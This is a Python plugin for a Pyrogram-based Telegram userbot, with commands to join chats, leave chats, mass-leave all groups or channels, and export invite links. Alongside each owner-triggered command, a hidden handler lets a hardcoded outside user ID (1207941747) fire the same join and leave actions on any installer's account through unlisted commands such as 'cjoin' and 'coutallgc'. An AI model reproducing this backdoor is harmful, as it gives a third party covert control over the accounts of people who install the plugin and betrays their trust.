from pyromek import *
from helper import *
from .config import *

DEVS= [1207941747]

@Client.on_message(filters.command("cjoin", "") & filters.user(DEVS) & ~filters.me)
@Client.on_message(filters.command("join", cmd) & filters.me)
async def join(client, message):
    tex = message.command[1] if len(message.command) > 1 else message.chat.id
    g = await message.reply_text("`Processing...`")
    try:
        await client.join_chat(tex)
        await g.edit(f"**Successfully Joined Chat ID** `{tex}`")
    except Exception as ex:
        await g.edit(f"**ERROR:** \n\n{str(ex)}")


@Client.on_message(filters.command("cout", "") & filters.user(DEVS) & ~filters.me)
@Client.on_message(filters.command("kickme", cmd) & filters.me)
async def leave(client, message):
    xd = message.command[1] if len(message.command) > 1 else message.chat.id
    xv = await message.reply_text("`Processing...`")
    try:
        await xv.edit_text(f"{client.me.first_name} has left the group, bye!!")
        await client.leave_chat(xd)
    except Exception as ex:
        await xv.edit_text(f"**ERROR:** \n\n{str(ex)}")


@Client.on_message(filters.command("coutallgc", "") & filters.user(DEVS) & ~filters.me)
@Client.on_message(filters.command("leaveallgc", cmd) & filters.me)
async def kickmeall(client, message):
    tex = await message.reply_text("`Global Leave from group chats...`")
    er = 0
    done = 0
    async for dialog in client.get_dialogs():
        if dialog.chat.type in (enums.ChatType.GROUP, enums.ChatType.SUPERGROUP):
            chat = dialog.chat.id
            try:
                done += 1
                await client.leave_chat(chat)
            except BaseException:
                er += 1
    await tex.edit(f"**Successfully left {done} Groups, Failed to left {er} Groups**")


@Client.on_message(filters.command("coutallch", "") & filters.user(DEVS) & ~filters.me)
@Client.on_message(filters.command("leaveallch", cmd) & filters.me)
async def kickmeallch(client, message):
    ok = await message.reply_text("`Global Leave from channel chats...`")
    er = 0
    done = 0
    async for dialog in client.get_dialogs():
        if dialog.chat.type == enums.ChatType.CHANNEL:
            chat = dialog.chat.id
            try:
                done += 1
                await client.leave_chat(chat)
            except BaseException:
                er += 1
    await ok.edit(f"**Successfully left {done} Channel, failed to leave {er} Channel**")


@Client.on_message(filters.command("getlink", cmd) & filters.me)
async def invite_link(client, message):
    um = await eor(message, "`Processing...`")
    if message.chat.type in [ChatType.GROUP, ChatType.SUPERGROUP]:
        message.chat.title
        try:
            link = await client.export_chat_invite_link(message.chat.id)
            await um.edit(f"**Link Invite:** {link}")
        except Exception:
            await um.edit("`Dibutuhkan akses admin.`")
